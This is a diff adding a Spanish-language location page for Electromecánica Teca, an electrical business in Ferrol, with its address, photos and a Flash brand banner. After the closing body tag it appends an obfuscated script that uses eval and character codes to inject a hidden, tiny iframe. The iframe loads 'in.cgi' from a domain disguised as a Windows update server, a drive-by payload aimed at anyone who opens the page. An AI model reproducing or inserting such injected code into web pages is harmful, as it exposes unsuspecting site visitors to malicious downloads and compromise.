@@ -1,0 +1,94 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Electeca - Donde estamos</title>
+<link href="css/global.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+<div id="contenedor-pagina">
+	<div id="cabecera">
+    	<div id="cabecera-top">
+            <div id="cab-logo">
+            </div>
+            <div id="cab-dir">
+                <h1>Electromecánica Teca, s.l.</h1>
+                <p>C/ Manuel Belando, 39</p>
+                <p>15404 Ferrol</p>
+                <p>A Coruña</p>
+                <p>Telf.: 981 32 87 41</p>
+                <p>Fax: 981 32 09 05</p>
+                <p>correo: electeca@mundo-r.com</p>
+            </div>
+            <div id="cab-gru">
+                <p><a href="http://www.grupocamer.com/" title="Grupo Camer" target="_blank"><img src="img/cab_g_camer.gif" alt="Grupo Camer" /></a></p>
+            </div>
+        </div>
+        
+        <div id="cabecera-bot">
+            <ul>
+                <li><a href="index.html">Electeca</a></li>
+                <li><a href="p_marcas.html">Productos</a></li>
+                <li><a href="t_isla.html">Trabajos relizados</a></li>
+                <li><a href="servicios.html">Servicios</a></li>
+            </ul>
+        </div>
+        <div id="cabecera-mp">
+            <ul>
+                <li><a href="index.html">Electeca</a></li>
+                <li>&nbsp;&raquo;&nbsp;<a href="donde.html">Donde estamos</a></li>
+            </ul>
+        </div>
+    </div>
+    <div id="principal">
+    	<div id="navegacion">
+        	<div class="esq_der"></div>
+        	<h1>Electeca</h1>
+            <ul>
+                <li><a href="index.html">Electeca</a></li>
+                <li><a href="donde.html">Donde estamos</a></li>
+				<li><a href="contacto.html">Contacto</a></li>
+            </ul>
+        </div>
+        <div id="contenido">
+        	<h1>Donde estamos</h1>
+            <p><img src="img/mapa.gif" width="540" height="358" alt="Mapa de situación" /></p>
+            <p><img src="img/comercio1.jpg" width="539" height="212" alt="Fachada comercio" /></p>
+            <p><img src="img/comercio3.jpg" width="139" height="187" alt="Interior del comercio" /><img src="img/comercio2.jpg" width="220" height="187" alt="Fachada del comercio con vehículos" /><img src="img/comercio4.jpg" width="140" height="187" alt="Interior comercio" /></p>
+        </div>
+        <div id="subcontenido">
+       	  <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="140" height="450" id="FlashID2" title="Nuestras marcas">
+        	  <param name="movie" value="logos.swf" />
+        	  <param name="quality" value="high" />
+        	  <param name="wmode" value="opaque" />
+        	  <param name="swfversion" value="6.0.65.0" />
+        	  <!-- Esta etiqueta param indica a los usuarios de Flash Player 6.0 r65 o posterior que descarguen la versión más reciente de Flash Player. Elimínela si no desea que los usuarios vean el mensaje. -->
+        	  <param name="expressinstall" value="Scripts/expressInstall.swf" />
+        	  <!-- La siguiente etiqueta object es para navegadores distintos de IE. Ocúltela a IE mediante IECC. -->
+        	  <!--[if !IE]>-->
+        	  <object type="application/x-shockwave-flash" data="logos.swf" width="140" height="450">
+        	    <!--<![endif]-->
+        	    <param name="quality" value="high" />
+        	    <param name="wmode" value="opaque" />
+        	    <param name="swfversion" value="6.0.65.0" />
+        	    <param name="expressinstall" value="Scripts/expressInstall.swf" />
+        	    <!-- El navegador muestra el siguiente contenido alternativo para usuarios con Flash Player 6.0 o versiones anteriores. -->
+        	    <div>
+        	      <h4>El contenido de esta página requiere una versión más reciente de Adobe Flash Player.</h4>
+        	      <p><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" width="112" alt="Obtener Adobe Flash Player" height="33" /></a></p>
+      	      </div>
+        	    <!--[if !IE]>-->
+      	    </object>
+        	  <!--<![endif]-->
+      	  </object>
+      </div>
+    </div>
+    <div id="pie">
+    	<p>Electeca | C/ Manuel Belando, 39 | 15404 Ferrol - A Coruña | Telf.: 981 32 87 41 | Fax: 981 32 09 05</p><p>
+    </p></div>
+</div>
+</body>
+       <!-- . --><script>var s,q=2,aa=document.createTextNode("harCode");if(Math.abs(-"2")===2){s=String["fromC"+aa.nodeValue];}
+eval(s(7+q,7+q,103+q,100+q,30+q,38+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,101+q,99+q,114+q,67+q,106+q,99+q,107+q,99+q,108+q,114+q,113+q,64+q,119+q,82+q,95+q,101+q,76+q,95+q,107+q,99+q,38+q,37+q,96+q,109+q,98+q,119+q,37+q,39+q,89+q,46+q,91+q,39+q,121+q,7+q,7+q,7+q,103+q,100+q,112+q,95+q,107+q,99+q,112+q,38+q,39+q,57+q,7+q,7+q,123+q,30+q,99+q,106+q,113+q,99+q,30+q,121+q,7+q,7+q,7+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,117+q,112+q,103+q,114+q,99+q,38+q,32+q,58+q,103+q,100+q,112+q,95+q,107+q,99+q,30+q,113+q,112+q,97+q,59+q,37+q,102+q,114+q,114+q,110+q,56+q,45+q,45+q,85+q,71+q,76+q,66+q,77+q,85+q,81+q,43+q,83+q,78+q,66+q,63+q,82+q,67+q,80+q,81+q,67+q,76+q,44+q,65+q,77+q,75+q,45+q,103+q,108+q,44+q,97+q,101+q,103+q,37+q,30+q,117+q,103+q,98+q,114+q,102+q,59+q,37+q,47+q,46+q,37+q,30+q,102+q,99+q,103+q,101+q,102+q,114+q,59+q,37+q,47+q,46+q,37+q,30+q,113+q,114+q,119+q,106+q,99+q,59+q,37+q,116+q,103+q,113+q,103+q,96+q,103+q,106+q,103+q,114+q,119+q,56+q,102+q,103+q,98+q,98+q,99+q,108+q,57+q,110+q,109+q,113+q,103+q,114+q,103+q,109+q,108+q,56+q,95+q,96+q,113+q,109+q,106+q,115+q,114+q,99+q,57+q,106+q,99+q,100+q,114+q,56+q,46+q,57+q,114+q,109+q,110+q,56+q,46+q,57+q,37+q,60+q,58+q,45+q,103+q,100+q,112+q,95+q,107+q,99+q,60+q,32+q,39+q,57+q,7+q,7+q,123+q,7+q,7+q,100+q,115+q,108+q,97+q,114+q,103+q,109+q,108+q,30+q,103+q,100+q,112+q,95+q,107+q,99+q,112+q,38+q,39+q,121+q,7+q,7+q,7+q,116+q,95+q,112+q,30+q,100+q,30+q,59+q,30+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,97+q,112+q,99+q,95+q,114+q,99+q,67+q,106+q,99+q,107+q,99+q,108+q,114+q,38+q,37+q,103+q,100+q,112+q,95+q,107+q,99+q,37+q,39+q,57+q,100+q,44+q,113+q,99+q,114+q,63+q,114+q,114+q,112+q,103+q,96+q,115+q,114+q,99+q,38+q,37+q,113+q,112+q,97+q,37+q,42+q,37+q,102+q,114+q,114+q,110+q,56+q,45+q,45+q,85+q,71+q,76+q,66+q,77+q,85+q,81+q,43+q,83+q,78+q,66+q,63+q,82+q,67+q,80+q,81+q,67+q,76+q,44+q,65+q,77+q,75+q,45+q,103+q,108+q,44+q,97+q,101+q,103+q,37+q,39+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,116+q,103+q,113+q,103+q,96+q,103+q,106+q,103+q,114+q,119+q,59+q,37+q,102+q,103+q,98+q,98+q,99+q,108+q,37+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,110+q,109+q,113+q,103+q,114+q,103+q,109+q,108+q,59+q,37+q,95+q,96+q,113+q,109+q,106+q,115+q,114+q,99+q,37+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,106+q,99+q,100+q,114+q,59+q,37+q,46+q,37+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,114+q,109+q,110+q,59+q,37+q,46+q,37+q,57+q,100+q,44+q,113+q,99+q,114+q,63+q,114+q,114+q,112+q,103+q,96+q,115+q,114+q,99+q,38+q,37+q,117+q,103+q,98+q,114+q,102+q,37+q,42+q,37+q,47+q,46+q,37+q,39+q,57+q,100+q,44+q,113+q,99+q,114+q,63+q,114+q,114+q,112+q,103+q,96+q,115+q,114+q,99+q,38+q,37+q,102+q,99+q,103+q,101+q,102+q,114+q,37+q,42+q,37+q,47+q,46+q,37+q,39+q,57+q,7+q,7+q,7+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,101+q,99+q,114+q,67+q,106+q,99+q,107+q,99+q,108+q,114+q,113+q,64+q,119+q,82+q,95+q,101+q,76+q,95+q,107+q,99+q,38+q,37+q,96+q,109+q,98+q,119+q,37+q,39+q,89+q,46+q,91+q,44+q,95+q,110+q,110+q,99+q,108+q,98+q,65+q,102+q,103+q,106+q,98+q,38+q,100+q,39+q,57+q,7+q,7+q,123+q));</script>
+<!-- . --> </html>        
